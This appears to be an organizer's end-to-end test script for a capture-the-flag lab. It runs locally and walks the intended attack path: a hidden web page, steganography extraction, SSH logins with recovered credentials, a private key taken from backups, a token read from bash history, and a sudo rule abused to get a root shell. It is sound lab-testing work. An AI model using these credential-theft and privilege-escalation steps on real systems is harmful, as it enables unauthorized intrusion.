#!/usr/bin/env bash
# ==============================================================================
# test_attack_path.sh - organizer/dev end-to-end test that walks the exact
# intended player path against 127.0.0.1 and confirms every stage works from
# a clean install.
#
# Requires (organizer/dev machine only, not part of the player-facing
# install): sshpass, steghide, curl, ssh-keygen, strings, python3.
#
# This never leaves the local machine and must never be exposed to players.
#
# Usage: sudo bash tests/test_attack_path.sh
# ==============================================================================
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../scripts/config.sh
source "${SCRIPT_DIR}/../scripts/config.sh"

[ "$(id -u)" -eq 0 ] || { echo "Run as root."; exit 1; }

SECRETS_FILE="${CTF_ORGANIZER_DIR}/secrets.env"
[ -f "${SECRETS_FILE}" ] || { echo "Secrets manifest not found. Run install_ctf.sh first."; exit 1; }
source "${SECRETS_FILE}"

for tool in sshpass steghide curl ssh-keygen strings python3; do
    command -v "$tool" >/dev/null 2>&1 || { echo "Missing required test tool: $tool"; exit 1; }
done

WORK="$(mktemp -d)"
trap 'rm -rf "${WORK}"; kill %1 2>/dev/null || true' EXIT

FAILED=0
step() {
    if [ "$2" -eq 0 ]; then printf '[PASS] %s\n' "$1"; else printf '[FAIL] %s\n' "$1"; FAILED=1; fi
}

SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -p "${SSH_PORT}")

echo "== Stage 1: web + robots.txt + Flag 1 =="
curl -s -o /dev/null -w '' --max-time 5 "http://127.0.0.1/"
step "Web reachable" $?

curl -s --max-time 5 "http://127.0.0.1/robots.txt" | grep -q "${ROBOTS_HIDDEN_PATH}"
step "robots.txt reveals hidden path" $?

flag1_page="$(curl -s --max-time 5 "http://127.0.0.1/hidden/${ROBOTS_HIDDEN_PATH}/index.html")"
flag1_decoded="$(printf '%s' "${flag1_page}" | grep -oP 'Ref:\s*\K\S+' | base64 -d 2>/dev/null)"
[ "${flag1_decoded}" = "${FLAG1}" ]
step "Flag 1 recovered from hidden page" $?

echo
echo "== Stage 2: steghide + rockyou + SSH password =="
curl -s --max-time 5 -o "${WORK}/${STEGHIDE_IMAGE_NAME}" "http://127.0.0.1/assets/${STEGHIDE_IMAGE_NAME}"
step "Stego image downloaded" $?

steghide extract -sf "${WORK}/${STEGHIDE_IMAGE_NAME}" -p "${STEGHIDE_PASSPHRASE}" -xf "${WORK}/${STEGHIDE_PAYLOAD_NAME}" -f -q
step "steghide extraction with configured passphrase" $?

agent99_pass_decoded="$(grep -oP '^\S+={0,2}$' "${WORK}/${STEGHIDE_PAYLOAD_NAME}" | tail -n1 | base64 -d 2>/dev/null)"
[ "${agent99_pass_decoded}" = "${AGENT99_PASSWORD}" ]
step "Agent99 SSH password recovered from extracted payload" $?

echo
echo "== Stage 3: SSH as Agent99, Flag 2, hidden clue =="
sshpass -p "${AGENT99_PASSWORD}" ssh "${SSH_OPTS[@]}" "${AGENT99_USER}@127.0.0.1" "true" 2>/dev/null
step "SSH login as ${AGENT99_USER}" $?

flag2_b64="$(sshpass -p "${AGENT99_PASSWORD}" ssh "${SSH_OPTS[@]}" "${AGENT99_USER}@127.0.0.1" \
    "grep -oP '^entry_hash=\\K.*' ~/.net-cache.idx" 2>/dev/null)"
[ "$(printf '%s' "${flag2_b64}" | base64 -d 2>/dev/null)" = "${FLAG2}" ]
step "Flag 2 recovered" $?

clue_text="$(sshpass -p "${AGENT99_PASSWORD}" ssh "${SSH_OPTS[@]}" "${AGENT99_USER}@127.0.0.1" \
    "cat ~/.cache-index/clue.dat 2>/dev/null | base64 -d" 2>/dev/null)"
[ -n "${clue_text}" ]
step "Hidden directory clue recovered" $?

echo
echo "== Stage 4: backup investigation, Flag 3, id_rsa =="
flag3_b64="$(sshpass -p "${AGENT99_PASSWORD}" ssh "${SSH_OPTS[@]}" "${AGENT99_USER}@127.0.0.1" \
    "grep -A1 'Archive checksum' ${BACKUP_DIR}/ops-notes.txt 2>/dev/null | tail -n1" 2>/dev/null)"
[ "$(printf '%s' "${flag3_b64}" | base64 -d 2>/dev/null)" = "${FLAG3}" ]
step "Flag 3 recovered from backup" $?

sshpass -p "${AGENT99_PASSWORD}" scp "${SSH_OPTS[@]}" \
    "${AGENT99_USER}@127.0.0.1:${BACKUP_KEYS_DIR}/${BACKUP_KEY_FILENAME}" "${WORK}/id_rsa" 2>/dev/null
chmod 600 "${WORK}/id_rsa" 2>/dev/null
step "Private key retrieved from backup area" $?

echo
echo "== Stage 5: SSH as Agent999, Flag 4 =="
ssh "${SSH_OPTS[@]}" -i "${WORK}/id_rsa" "${AGENT999_USER}@127.0.0.1" "true" 2>/dev/null
step "SSH login as ${AGENT999_USER} with recovered key" $?

flag4_b64="$(ssh "${SSH_OPTS[@]}" -i "${WORK}/id_rsa" "${AGENT999_USER}@127.0.0.1" \
    "grep -oP \"LEGACY_TOKEN='\\K[^']+\" ~/.bash_history" 2>/dev/null)"
[ "$(printf '%s' "${flag4_b64}" | base64 -d 2>/dev/null)" = "${FLAG4}" ]
step "Flag 4 recovered from bash history" $?

echo
echo "== Stage 6: sudo rule, python transfer, RE, root, Flag 5 =="
sudo_l="$(ssh "${SSH_OPTS[@]}" -i "${WORK}/id_rsa" "${AGENT999_USER}@127.0.0.1" "sudo -l" 2>/dev/null)"
printf '%s' "${sudo_l}" | grep -qF "${BEROOT_BIN}"
step "sudo -l reveals the allowed .beroot command" $?

# Simulate the Python HTTP server transfer technique end to end.
ssh "${SSH_OPTS[@]}" -i "${WORK}/id_rsa" "${AGENT999_USER}@127.0.0.1" \
    "cd ${AGENT999_HIDDEN_DIR} && nohup python3 -m http.server 8901 >/tmp/.httpd.log 2>&1 & sleep 1" 2>/dev/null
curl -s --max-time 5 -o "${WORK}/.beroot" "http://127.0.0.1:8901/.beroot"
step ".beroot transferred via Python HTTP server" $?
ssh "${SSH_OPTS[@]}" -i "${WORK}/id_rsa" "${AGENT999_USER}@127.0.0.1" \
    "pkill -f 'http.server 8901'" 2>/dev/null || true

strings "${WORK}/.beroot" 2>/dev/null | grep -qF "${BEROOT_PASSWORD}"
step ".beroot password recoverable via strings/Ghidra-equivalent" $?

# .beroot takes no arguments - once the password check passes it execs an
# interactive /bin/bash which inherits the same stdin, so the follow-up
# command is sent as a second line on stdin rather than as an argv to .beroot.
whoami_out="$(ssh "${SSH_OPTS[@]}" -i "${WORK}/id_rsa" "${AGENT999_USER}@127.0.0.1" \
    "printf '%s\n%s\n' '${BEROOT_PASSWORD}' 'whoami' | sudo ${BEROOT_BIN}" 2>/dev/null | tail -n1)"
[ "${whoami_out}" = "root" ]
step "Root shell obtained via .beroot" $?

flag5_b64="$(ssh "${SSH_OPTS[@]}" -i "${WORK}/id_rsa" "${AGENT999_USER}@127.0.0.1" \
    "printf '%s\n%s\n' '${BEROOT_PASSWORD}' 'cat /root/.sysconfig_cache' | sudo ${BEROOT_BIN}" 2>/dev/null | tail -n1)"
[ "$(printf '%s' "${flag5_b64}" | base64 -d 2>/dev/null)" = "${FLAG5}" ]
step "Flag 5 recovered from /root" $?

echo
if [ "${FAILED}" -eq 0 ]; then
    echo "ATTACK PATH: FULLY VERIFIED"
else
    echo "ATTACK PATH: ONE OR MORE STAGES FAILED"
fi
exit "${FAILED}"
